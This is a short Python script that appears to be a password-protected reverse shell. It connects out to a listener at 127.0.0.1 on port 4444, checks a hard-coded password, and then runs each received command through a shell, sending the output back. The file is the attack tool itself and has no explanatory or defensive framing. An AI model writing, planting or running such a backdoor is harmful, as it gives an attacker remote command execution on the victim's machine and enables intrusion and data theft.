#!/usr/bin/python
import socket
import subprocess
password = "9600231653212"
def Login():
	global s
	global password
	s.send("Enter a password: ")
	userinput = s.recv(1024)
	if userinput.strip() != password:
		Login()
	else:
		s.send("Connected #> ")
		Shell()


def Shell():
	while True:
		usrinput = s.recv(1024)
		if usrinput.strip() == ":kill":
			break
		proc = subprocess.Popen(usrinput, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		s.send(output)
		s.send("#>>")




host = "127.0.0.1"
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
